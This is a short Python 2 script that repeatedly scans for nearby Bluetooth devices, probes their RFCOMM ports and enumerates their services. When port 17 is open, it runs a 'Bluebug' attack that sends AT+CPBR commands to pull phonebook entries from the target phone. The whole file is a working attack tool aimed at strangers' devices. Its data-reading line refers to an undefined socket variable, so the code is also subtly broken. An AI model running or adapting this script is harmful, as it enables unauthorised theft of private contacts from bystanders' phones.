#!/usr/bin/env python
# -*- coding: utf-8 -*-

from bluetooth import *
import time

alreadyFound = []


def rfcommCon(addr, port):
    sock = BluetoothSocket(RFCOMM)
    try:
        sock.connect((addr, port))
        print '[+] RFCOMM Port ' + str(port) + ' open'
        sock.close()
        return True
    except Exception, e:
        print '[-] RFCOMM Port ' + str(port) + ' closed'
        return None

def enumServices(addr):
    print '[=] Attempting Service Discovery'
    services = find_service(address=addr)
    if len(services) > 0:
        for svc in services:
            print("[+]Service Name: %s"    % svc["name"])
            print("[+]    Host:        %s" % svc["host"])
            print("[+]    Description: %s" % svc["description"])
            print("[+]    Provided By: %s" % svc["provider"])
            print("[+]    Protocol:    %s" % svc["protocol"])
            print("[+]    channel/PSM: %s" % svc["port"])
            print("[+]    svc classes: %s "% svc["service-classes"])
            print("[+]    profiles:    %s "% svc["profiles"])
            print("[+]    service id:  %s "% svc["service-id"]) 
    print '[=] Service Discovery Complete'

def bluebug(addr, port):
    print '[=] Attempting Bluebug'
    sock = BluetoothSocket(RFCOMM)
    try:
        sock.connect((addr, port))
        for contact in range(1, 5):
            atCmd = 'AT+CPBR=' + str(contact) + '\n'
            sock.send(atCmd)
            result = client_sock.recv(1024)
            print '[+] ' + str(contact) + ' : ' + result
        sock.close()
    except Exception, e:
        print '[-] Bluebug failed'
    print '[=] Bluebug Complete'

def findDevs():
    foundDevs = discover_devices(lookup_names=True)
    for (addr, name) in foundDevs:
        if addr not in alreadyFound:
            print '[*] Found Bluetooth Device: ' + str(name)
            print '[+] MAC address: ' + str(addr)
            print '[=] Starting port scan'
            for port in range(1, 30):
                test=rfcommCon(addr, port)
                if port == 17 and test is True:
		    bluebug(addr, port)	
            print '[=] Port scan Complete'
            enumServices(addr)
            alreadyFound.append(addr)
            print

while True:
    findDevs()
    time.sleep(5)
